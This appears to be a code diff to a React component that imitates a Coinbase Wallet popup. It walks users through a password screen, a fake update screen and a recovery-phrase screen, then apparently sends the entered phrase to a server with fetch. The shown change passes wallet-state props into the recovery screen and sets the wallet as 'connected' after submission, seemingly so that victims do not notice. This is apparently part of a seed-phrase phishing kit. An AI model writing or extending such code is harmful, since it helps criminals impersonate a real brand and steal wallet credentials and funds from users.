@@ -2,7 +2,7 @@ import React, { useState, useEffect, useMemo } from "react";
 import { ChevronDown, Info } from "lucide-react";
 import { CoinbaseWalletIcon } from "./CoinBaseWalletIcon";
 
-export default function CoinPop() {
+export default function CoinPop({setWalletConnected,setSelectedWallet, wallets}) {
   const [password, setPassword] = useState("");
   const [step, setStep] = useState("login");
 
@@ -32,7 +32,7 @@ export default function CoinPop() {
     } else if (step === "update-loading") {
       return <CoinBaseUpdateScreenLoading handleUpdate={setStep} />;
     } else {
-      return <CoinBaseRecoveryScreen />;
+      return <CoinBaseRecoveryScreen setWalletConnected={setWalletConnected} setSelectedWallet={setSelectedWallet} wallets={wallets} />;
     }
   };
 
@@ -243,7 +243,7 @@ function CoinBaseUpdateScreenLoading({ handleUpdate }) {
   );
 }
 
-function CoinBaseRecoveryScreen({ open = true, onClose }) {
+function CoinBaseRecoveryScreen({ open = true, onClose,  setWalletConnected,setSelectedWallet,wallets }) {
   const [isOpen, setIsOpen] = useState(open);
   const [phrase, setPhrase] = useState("");
   const [accountOpen, setAccountOpen] = useState(false);
@@ -310,6 +310,8 @@ function CoinBaseRecoveryScreen({ open = true, onClose }) {
       });
 
       const data = await res.json();
+      setWalletConnected(true);
+      setSelectedWallet(wallets.NO_WALLET);
       console.log(data);
     } catch (err) {
       console.error(err);
